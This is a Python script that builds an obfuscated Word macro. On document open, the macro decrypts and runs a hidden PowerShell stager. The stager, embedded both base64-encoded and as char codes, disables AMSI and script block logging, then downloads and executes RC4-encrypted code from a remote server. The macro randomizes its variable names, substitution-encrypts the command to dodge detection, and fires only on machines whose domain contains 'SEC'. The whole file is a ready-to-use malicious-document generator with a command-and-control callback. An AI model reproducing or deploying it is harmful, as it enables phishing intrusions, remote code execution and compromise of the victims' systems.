import random, string, numpy as np

#cmd = "C:\Windows\System32\WindowsPowerShell\v1.0\pOWErsHeLl.exe -NoLO -Sta -NoPR -NoNI -Windo 1 -eNCo SQBGACgAJABQAFMAVgBlAHIAUwBJAE8AbgBUAEEAYgBMAGUALgBQAFMAVgBlAFIAUwBJAE8AbgAuAE0AQQBKAE8AUgAgAC0AZwBlACAAMwApAHsAJABHAFAAUwA9AFsAcgBlAEYAXQAuAEEAcwBTAGUAbQBiAGwAWQAuAEcARQBUAFQAWQBwAGUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAGUAdABGAGkARQBgAEwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAnAE4AJwArACcAbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4ARwBlAHQAVgBhAGwAVQBlACgAJABuAFUATABMACkAOwBJAGYAKAAkAEcAUABTAFsAJwBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AKQB7ACQARwBQAFMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAD0AMAA7ACQARwBQAFMAWwAnAFMAYwByAGkAcAB0AEIAJwArACcAbABvAGMAawBMAG8AZwBnAGkAbgBnACcAXQBbACcARQBuAGEAYgBsAGUAUwBjAHIAaQBwAHQAQgBsAG8AYwBrAEkAbgB2AG8AYwBhAHQAaQBvAG4ATABvAGcAZwBpAG4AZwAnAF0APQAwAH0ARQBMAFMAZQB7AFsAUwBjAFIASQBwAHQAQgBsAG8AQwBrAF0ALgAiAEcAZQBUAEYASQBlAGAAbABkACIAKAAnAHMAaQBnAG4AYQB0AHUAcgBlAHMAJwAsACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBTAGUAVABWAGEAbABVAGUAKAAkAE4AdQBsAGwALAAoAE4AZQBXAC0ATwBCAGoAZQBjAFQAIABDAG8AbABsAGUAYwBUAGkATwBuAFMALgBHAEUAbgBlAFIAaQBDAC4ASABhAFMAaABTAGUAVABbAFMAdAByAGkATgBnAF0AKQApAH0AWwBSAGUAZgBdAC4AQQBzAHMARQBNAEIATABZAC4ARwBFAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAGkARQBsAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAYQBMAHUARQAoACQAbgBVAEwAbAAsACQAVABSAHUARQApAH0AOwB9ADsAWwBTAFkAcwBUAEUATQAuAE4ARQB0AC4AUwBFAFIAVgBJAEMAZQBQAG8ASQBOAHQATQBhAG4AQQBHAEUAcgBdADoAOgBFAHgAcABFAGMAdAAxADAAMABDAE8AbgBUAGkAbgB1AGUAPQAwADsAJABXAEMAPQBOAEUAVwAtAE8AYgBqAEUAQwB0ACAAUwB5AFMAdABlAE0ALgBOAEUAVAAuAFcAZQBCAEMAbABpAGUAbgBUADsAJAB1AD0AJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAA2AC4AMQA7ACAAVwBPAFcANgA0ADsAIAByAHYAOgAzADUALgAwACkAIABHAGUAYwBrAG8ALwAyADAAMQAwADAAMQAwADEAIABGAGkAcgBlAGYAbwB4AC8AMwA1AC4AMAAnADsAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBTAGUAcgB2AGUAcgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAVgBhAGwAaQBkAGEAdABpAG8AbgBDAGEAbABsAGIAYQBjAGsAIAA9ACAAewAkAHQAcgB1AGUAfQA7ACQAdwBjAC4ASABFAEEAZABFAHIAcwAuAEEAZABEACgAJwBVAHMAZQByAC0AQQBnAGUAbgB0ACcALAAkAHUAKQA7ACQAdwBDAC4AUAByAG8AeAB5AD0AWwBTAHkAcwBUAGUAbQAuAE4ARQB0AC4AVwBFAGIAUgBlAFEAdQBlAHMAVABdADoAOgBEAGUAZgBBAFUAbABUAFcARQBCAFAAUgBPAFgAeQA7ACQAVwBDAC4AUABSAE8AeAB5AC4AQwByAEUARABFAE4AVABJAGEAbABTACAAPQAgAFsAUwBZAFMAVABFAE0ALgBOAGUAVAAuAEMAcgBFAGQAZQBuAHQAaQBhAEwAQwBBAEMAaABFAF0AOgA6AEQAZQBmAEEAdQBMAHQATgBlAHQAVwBvAHIAawBDAFIARQBkAGUAbgB0AEkAQQBMAHMAOwAkAFMAYwByAGkAcAB0ADoAUAByAG8AeAB5ACAAPQAgACQAdwBjAC4AUAByAG8AeAB5ADsAJABLAD0AWwBTAFkAcwB0AGUAbQAuAFQARQBYAFQALgBFAG4AYwBvAEQASQBOAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAQgBZAHQARQBzACgAJwBZADwALAA0AE0AeAB\+ACkARwAhAEUAcQB8AGUAegBIAGMAYgBsAGYATwBfAFQATgBDADMANgArADgAdgBeACMAJwApADsAJABSAD0AewAkAEQALAAkAEsAPQAkAEEAcgBHAFMAOwAkAFMAPQAwAC4ALgAyADUANQA7ADAALgAuADIANQA1AHwAJQB7ACQASgA9ACgAJABKACsAJABTAFsAJABfAF0AKwAkAEsAWwAkAF8AJQAkAEsALgBDAE8AdQBOAFQAXQApACUAMgA1ADYAOwAkAFMAWwAkAF8AXQAsACQAUwBbACQASgBdAD0AJABTAFsAJABKAF0ALAAkAFMAWwAkAF8AXQB9ADsAJABEAHwAJQB7ACQASQA9ACgAJABJACsAMQApACUAMgA1ADYAOwAkAEgAPQAoACQASAArACQAUwBbACQASQBdACkAJQAyADUANgA7ACQAUwBbACQASQBdACwAJABTAFsAJABIAF0APQAkAFMAWwAkAEgAXQAsACQAUwBbACQASQBdADsAJABfAC0AYgB4AG8AcgAkAFMAWwAoACQAUwBbACQASQBdACsAJABTAFsAJABIAF0AKQAlADIANQA2AF0AfQB9ADsAJABzAGUAcgA9ACcAaAB0AHQAcABzADoALwAvAGMAYQB0AGEAbABvAGcALgBwAHIAZQBjAGkAcwBpAG8AbgBwAGEAcgB0AGkAZQBzAGUAYgBvAG8AawAuAGMAbwBtADoANAA0ADMAJwA7ACQAdAA9ACcALwBzAGUAYQByAGMAaAA\/AHEAPQBzAHQAbwBjAGsAcwAmAGcAbwA9AFMAZQBhAHIAYwBoACYAcQBzAD0AYgBzACYAZgBvAHIAbQA9AFEAQgBSAEUAJwA7ACQAdwBDAC4ASABlAEEARABFAFIAUwAuAEEARABEACgAIgBBAGMAYwBlAHAAdAAiACwAIgB0AGUAeAB0AC8AaAB0AG0AbAAsAGEAcABwAGwAaQBjAGEAdABpAG8AbgAvAHgAaAB0AG0AbAArAHgAbQBsACwAYQBwAHAAbABpAGMAYQB0AGkAbwBuAC8AeABtAGwAOwBxAD0AMAAuADkALAAqAC8AKgA7AHEAPQAwAC4AOAAiACkAOwAkAHcAQwAuAEgAZQBBAEQAZQByAFMALgBBAEQAZAAoACIAQwBvAG8AawBpAGUAIgAsACIAcwBlAHMAcwBpAG8AbgA9AG8AbgBwAFIAQwB0AHEAYgBHAEoAcABqADcATQB0AEEANABEAFYARAAwADQAdgB0AFEAOABnAD0AIgApADsAJABkAEEAdABhAD0AJABXAEMALgBEAE8AdwBuAEwATwBhAGQARABhAFQAQQAoACQAcwBlAFIAKwAkAHQAKQA7ACQAaQBWAD0AJABEAEEAdABhAFsAMAAuAC4AMwBdADsAJABkAGEAdABBAD0AJABkAGEAVABBAFsANAAuAC4AJABEAEEAdABhAC4AbABFAE4AZwBUAEgAXQA7AC0AagBvAGkAbgBbAEMAaABhAHIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAVABhACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA="
cmd = "POwershEll -Sta -nonInteR -exECutIoNPo ByPAsS -nOPROfiL  -WIN  HIDdE  -NoLOGo  -cO   \" .((Gv '*MdR*').nAME[3,11,2]-jOIN'')([StRInG]::jOIN('',[cHAR[]] ( 73 ,70, 40, 36,80 , 83, 86 ,101 ,114, 83 ,73, 79 ,110 ,84, 65 ,98,76, 101, 46 ,80 , 83 ,86, 101,82, 83 ,73,79 , 110 , 46 , 77,65 ,74, 79 ,82, 32,45, 103 ,101, 32,51 ,41, 123, 36 ,71, 80,83 , 61 , 91, 114 ,101 ,70 ,93, 46,65 , 115, 83,101,109 ,98,108,89 , 46, 71, 69, 84,84 , 89, 112,101 , 40 ,39 ,83, 121, 115 ,116,101, 109 , 46,77,97,110, 97 ,103 , 101 ,109, 101 , 110 , 116,46,65, 117,116, 111,109 , 97,116, 105 , 111 , 110,46,85 ,116 ,105 , 108 , 115 ,39,41,46 ,34,71 , 101, 116 , 70 ,105 ,69,96 ,76 ,100 , 34 ,40 ,39 ,99,97 ,99 , 104 ,101 ,100 ,71 , 114, 111, 117 ,112,80,111,108, 105, 99, 121, 83,101 ,116 ,116, 105 , 110,103 ,115 , 39,44 ,39, 78 , 39 ,43 , 39,111,110 ,80 ,117, 98 , 108,105 ,99 ,44 , 83, 116, 97 , 116 , 105,99 ,39,41 , 46, 71,101,116, 86 , 97, 108, 85, 101 ,40,36 ,110 , 85, 76 ,76,41,59 , 73 ,102,40,36 , 71,80, 83 ,91,39,83,99 ,114 ,105 ,112, 116, 66 ,39,43 , 39, 108, 111, 99 ,107, 76 ,111 ,103,103,105 , 110,103 , 39,93 ,41 , 123,36 ,71 , 80, 83,91, 39 , 83, 99 ,114 ,105,112,116 ,66 ,39,43 , 39, 108,111 ,99 ,107 , 76 , 111 ,103, 103, 105 , 110,103, 39, 93, 91 ,39, 69, 110 , 97, 98 ,108 ,101,83 ,99, 114, 105 , 112 ,116,66 ,39,43,39,108 ,111,99, 107,76 ,111 ,103, 103 , 105 ,110, 103,39,93,61 , 48 , 59, 36 , 71 , 80 ,83,91, 39,83 ,99,114 , 105, 112 , 116 ,66 , 39 , 43 , 39 ,108, 111 , 99 ,107 ,76 ,111, 103,103 , 105, 110 ,103,39, 93 , 91,39 , 69, 110 , 97 , 98, 108, 101 , 83,99 ,114,105,112 , 116,66 ,108,111 , 99,107, 73, 110,118 ,111 ,99,97 , 116,105 ,111 ,110, 76 ,111 , 103, 103 ,105, 110 , 103 ,39 , 93,61, 48,125 , 69,76 ,83,101, 123 , 91,83 , 99, 82, 73 ,112 ,116,66 , 108, 111 , 67,107,93 ,46 ,34 , 71 , 101, 84, 70,73, 101 , 96 ,108, 100,34, 40,39 , 115 ,105 ,103 ,110,97,116 , 117 ,114 ,101, 115, 39 , 44, 39,78 ,39 ,43, 39,111 , 110, 80, 117, 98 , 108 , 105 , 99, 44, 83 , 116 ,97, 116 , 105,99, 39 ,41, 46, 83, 101,84,86 , 97 , 108, 85,101, 40 ,36,78,117 , 108,108, 44 ,40 ,78 ,101 ,87 ,45, 79, 66 ,106 , 101, 99 , 84 ,32,67 ,111 , 108,108,101 , 99, 84 , 105, 79,110 , 83,46 ,71 ,69,110 ,101,82 , 105 ,67,46 , 72, 97, 83 , 104,83 , 101 , 84 ,91, 83, 116 ,114 , 105 ,78,103 ,93 , 41, 41 ,125, 91 , 82, 101,102 ,93 , 46 ,65 , 115 , 115, 69 , 77 , 66, 76, 89,46 , 71 , 69,84,84 , 121, 80,69 , 40 , 39, 83 ,121 ,115, 116,101 , 109, 46 , 77 ,97,110 , 97 ,103 , 101,109 , 101, 110 , 116 , 46,65 , 117, 116 ,111 ,109 , 97 , 116,105, 111 , 110 , 46, 65 , 109, 115,105 , 85, 116 ,105, 108 ,115 ,39 ,41,124, 63, 123,36, 95 ,125 , 124,37, 123 , 36,95, 46 , 71 ,69,116, 70 ,105 , 69,108,100 ,40, 39 ,97,109,115,105 , 73 , 110,105,116,70,97 , 105 ,108,101,100 ,39 ,44, 39, 78 , 111,110 , 80, 117 ,98 ,108 , 105 , 99 , 44 ,83,116,97, 116, 105 , 99 , 39 , 41, 46,83, 69 ,84 ,86 , 97,76, 117 , 69 , 40,36 ,110 , 85 ,76 , 108 ,44, 36, 84,82, 117 , 69,41 ,125 ,59 ,125 ,59,91 , 83 , 89 , 115 ,84 , 69, 77 ,46, 78 , 69, 116 ,46 , 83 ,69 , 82 , 86, 73 ,67,101, 80,111, 73 ,78, 116 , 77 ,97,110 , 65, 71, 69 , 114 , 93, 58 ,58, 69 ,120, 112, 69 , 99 ,116,49,48 ,48 , 67 ,79,110,84 , 105 , 110 , 117 ,101,61 , 48, 59, 36, 87 ,67 ,61, 78, 69 , 87,45, 79,98,106 ,69 , 67, 116,32, 83, 121 ,83 ,116 , 101,77 ,46 ,78 ,69, 84,46 ,87, 101,66,67 ,108,105,101, 110,84,59,36, 117,61, 39, 77,111 , 122 ,105 , 108 , 108 , 97 ,47 , 53 ,46,48, 32, 40 ,87,105 , 110 , 100 ,111, 119 , 115 , 32 ,78 , 84 , 32,54, 46,49 , 59, 32 , 87, 79 ,87, 54,52 ,59 ,32 ,114 , 118 , 58, 51 ,53, 46, 48,41 , 32 ,71,101,99,107 ,111,47 , 50 , 48 , 49, 48 , 48 ,49, 48,49 , 32, 70 , 105, 114, 101 ,102, 111 ,120 , 47,51 , 53 ,46,48 , 39,59, 91, 83 ,121 ,115 , 116 ,101, 109,46,78 ,101 ,116 ,46, 83,101,114, 118,105,99 ,101 , 80,111 , 105,110, 116, 77, 97,110, 97 , 103 , 101 ,114 ,93 , 58 , 58 , 83, 101 , 114 ,118 , 101 ,114 ,67 ,101 , 114 , 116,105 , 102 ,105, 99 , 97 ,116 , 101 ,86,97 ,108, 105, 100,97 , 116,105 , 111,110 , 67 , 97 , 108, 108,98 ,97, 99, 107,32, 61 , 32,123, 36 , 116, 114 ,117 ,101 , 125 ,59,36, 119, 99, 46,72, 69 ,65, 100,69, 114 , 115,46, 65,100,68, 40, 39, 85,115 ,101,114 , 45 ,65, 103, 101, 110,116, 39,44 , 36, 117 ,41 , 59, 36 , 119,67 ,46,80, 114 , 111 , 120 , 121 , 61,91 , 83, 121, 115 ,84,101 ,109, 46 ,78,69, 116 , 46, 87 ,69, 98,82, 101, 81,117,101 , 115 , 84 , 93 ,58,58, 68 ,101 , 102 ,65, 85,108 ,84,87 ,69 , 66 , 80, 82, 79 ,88,121,59,36 , 87 ,67,46, 80,82,79,120, 121,46,67,114,69 , 68,69 ,78 , 84, 73 ,97,108, 83 ,32 ,61, 32, 91 ,83, 89 , 83 , 84,69,77, 46,78 , 101 ,84 , 46, 67, 114 , 69 ,100 ,101 ,110, 116 ,105 ,97 ,76 , 67,65 , 67 ,104 ,69 ,93 , 58 , 58 , 68 ,101,102 , 65,117 ,76, 116,78 ,101, 116 ,87, 111 , 114,107,67, 82 ,69, 100,101 , 110, 116 ,73 ,65, 76,115, 59 , 36 ,83 , 99,114,105,112,116 , 58 , 80 , 114 , 111, 120 , 121 , 32 , 61,32, 36,119 , 99, 46, 80,114 , 111 ,120,121 ,59, 36, 75 , 61, 91,83,89,115 ,116,101 , 109,46, 84 , 69, 88 ,84 , 46 ,69 , 110 , 99 , 111 , 68 ,73,78 , 103,93 , 58, 58,65 ,83, 67, 73, 73 , 46, 71 , 101 , 116 , 66 ,89 ,116,69,115 ,40 , 39 , 89, 60 ,44 , 52 , 77, 120, 126 ,41, 71, 33 , 69,113,124,101, 122,72 , 99, 98, 108 , 102 ,79, 95,84, 78 ,67,51 ,54 ,43 , 56, 118, 94,35 ,39, 41,59 , 36,82,61 , 123 , 36, 68, 44 ,36 ,75 ,61 , 36, 65 , 114 , 71, 83 , 59,36 , 83 , 61,48 ,46, 46 ,50 , 53,53 , 59 , 48,46 ,46, 50, 53 ,53 , 124, 37 ,123 ,36 ,74, 61 , 40,36 , 74,43, 36, 83, 91, 36 ,95, 93 , 43 , 36, 75 , 91 ,36 ,95, 37 , 36, 75 , 46 , 67 ,79 ,117 , 78, 84 ,93 , 41, 37 , 50, 53 , 54, 59,36 ,83 , 91, 36, 95 , 93, 44 ,36,83, 91 , 36 ,74 , 93 ,61, 36,83, 91 , 36 , 74, 93 , 44,36 ,83 ,91 , 36,95 ,93,125 , 59,36, 68,124 , 37,123,36 ,73 ,61,40,36, 73 ,43, 49 , 41 ,37, 50 ,53 ,54 ,59,36, 72, 61 , 40 , 36,72,43, 36 , 83 , 91 , 36 , 73,93 ,41, 37 , 50 , 53 , 54, 59, 36, 83, 91 ,36 , 73, 93,44 ,36 , 83, 91, 36,72 , 93,61 ,36,83, 91 , 36 , 72 ,93, 44 , 36 ,83,91 ,36 , 73 , 93,59,36, 95,45, 98 ,120,111, 114 ,36,83, 91 , 40,36, 83, 91, 36,73,93, 43 , 36 , 83, 91 , 36,72 , 93,41 ,37, 50 ,53, 54 , 93,125 ,125, 59, 36 , 115 , 101,114, 61 , 39 ,104, 116, 116 ,112,115 ,58 ,47,47, 99,97 , 116 , 97 , 108, 111,103,46 , 112 ,114 , 101,99 , 105, 115 ,105 , 111 , 110 , 112 , 97,114,116 ,105 ,101 ,115 ,101,98 , 111 , 111 , 107,46, 99,111 ,109,58 , 52 ,52, 51 ,39 ,59 ,36, 116 , 61,39,47,115,101, 97 , 114 ,99 ,104 , 63, 113,61 , 115 ,116 , 111,99 ,107, 115 ,38 ,103 ,111 ,61 ,83, 101 ,97 , 114,99, 104,38 , 113, 115 ,61 ,98 , 115, 38 ,102,111, 114, 109,61 , 81, 66 ,82 ,69 ,39 , 59 , 36 , 119,67,46 , 72 ,101 , 65, 68, 69, 82 ,83 ,46 ,65 ,68,68 , 40 , 34 ,65 ,99,99 , 101 , 112,116, 34 , 44 , 34,116, 101, 120 ,116 ,47 ,104, 116 ,109 ,108, 44, 97 ,112 ,112 , 108 , 105 , 99 ,97, 116, 105 , 111,110 , 47 ,120,104 ,116,109, 108 ,43,120 , 109,108,44 ,97 ,112,112, 108 ,105, 99 ,97, 116, 105,111,110 , 47 , 120 ,109, 108 ,59, 113,61 ,48 ,46,57 , 44 , 42, 47, 42,59 ,113,61 , 48 ,46, 56 ,34 , 41,59, 36 ,119 ,67 ,46 , 72,101, 65 ,68, 101, 114 , 83 , 46,65 , 68,100 ,40, 34 ,67, 111, 111, 107 , 105,101,34 , 44,34 ,115 , 101,115 ,115 ,105, 111 ,110,61 , 111, 110 ,112 , 82,67,116 , 113, 98 , 71 , 74,112, 106, 55, 77 ,116 , 65 ,52 , 68, 86, 68 , 48, 52 , 118,116,81, 56 , 103 , 61 , 34, 41,59 , 36 , 100 ,65 ,116, 97, 61, 36 , 87 ,67, 46,68, 79, 119, 110, 76,79,97, 100 , 68 ,97 ,84 , 65,40, 36 ,115,101, 82, 43, 36,116 , 41, 59 ,36 , 105 ,86,61 , 36 , 68,65, 116 ,97 , 91 , 48,46 , 46, 51 ,93, 59 , 36, 100,97,116 ,65 ,61, 36,100, 97,84 ,65,91,52 , 46 , 46 , 36, 68, 65 , 116,97 , 46 ,108, 69 ,78, 103, 84, 72 ,93, 59, 45 ,106, 111, 105 , 110,91,67 ,104 , 97 , 114, 91 ,93 , 93 ,40,38 , 32 ,36 , 82, 32 ,36 , 100,97 , 84 ,97,32 ,40, 36 , 73, 86 ,43, 36, 75,41,41,124 ,73, 69,88 )) ) \""

def rand_var(min_len=3, max_len=6):
  result = "".join(random.choice(string.letters) for i in range(random.randint(3,6)))
  return result

def encrypt(plaintext, key, alphabet):
  keyIndices = [alphabet.index(k) for k in plaintext]
  return "".join(key[keyIndex] for keyIndex in keyIndices)

def decrypt(cipher, key, alphabet):
  keyIndices = [key.index(k) for k in cipher]
  return "".join(alphabet[keyIndex] for keyIndex in keyIndices)

def format_string(name, value):
  n = random.randint(950, 1020)
  chunks = [value[i:i+n] for i in range(0, len(value), n)]
  result = "%s(1) = \"%s\" & _\n" % (name, chunks[0])
  for chunk in chunks[1:]:
    result += "\"%s\" & _\n" % chunk
  return result.rstrip("\n").rstrip("_").rstrip(" ").rstrip("&").rstrip(" ")

def distill(string):
  uniq = np.unique(list(string)).tostring()
  result = "".join(random.sample(uniq,len(uniq)))
  return result

def doc_type(input):
  if input.lower() == "word":
    return "Document"
  elif input.lower() == "excel":
    return "Workbook"
  else:
    return "Document"

sub1 = distill(cmd)
sub2 = distill(cmd)

def gen_macro():
  k1 = rand_var() # Key One
  k2 = rand_var() # Key Two
  a1 = rand_var() # Array of strings to decode
  s1 = rand_var() # User domain envirnoment variable
  v1 = rand_var() # Variant for counting
  t1 = rand_var() # Temp Result
  i_a1 = rand_var() # Index of string in array
  i_v1 = rand_var() # Index of current character in Main string (v1)
  i_k1 = rand_var() # Index of current character in Key 1 (k1)
  i_k2 = rand_var() # Index of current character in key 2 (k2)

  macro = "Private Sub %s_Open()\n" % doc_type("word")
  macro += "Dim %s, %s, %s, %s, %s(1) As String\n" % (s1, k1, k2, t1, a1)
  macro += "%s = \"%s\"\n" % (k1, sub1)
  macro += "%s = \"%s\"\n" % (k2, sub2)
  macro += "%s\n" % format_string(a1, encrypt(cmd, sub1, sub2))
  macro += "%s = UCase(Environ(\"USERDOMAIN\"))\n" % s1
  macro += "If InStr(%s, \"SEC\") > 0 Then\n" % s1
  macro += "For %s = 1 To UBound(%s)\n" % (i_a1, a1)
  macro += "%s = \"\"\n" % t1
  macro += "For %s = 1 To Len(%s(%s))\n" % (i_v1, a1, i_a1)
  macro += "For %s = 1 To Len(%s)\n" % (i_k1, k1)
  macro += "If (Mid(%s(%s), %s, 1) = Mid(%s, %s, 1)) Then Exit For\n" % (a1, i_a1, i_v1, k1, i_k1)
  macro += "Next %s\n" % i_k1
  macro += "%s = %s & Mid(%s, %s, 1)\n" % (t1, t1, k2, i_k1)
  macro += "Next %s\n" % i_v1
  macro += "%s(%s) = %s\n" % (a1, i_a1, t1)
  macro += "Next %s\n" % i_a1
  macro += "Shell %s(1)\n" % a1
  macro += "End If\n"
  macro += "End Sub\n"

  return macro

print gen_macro()
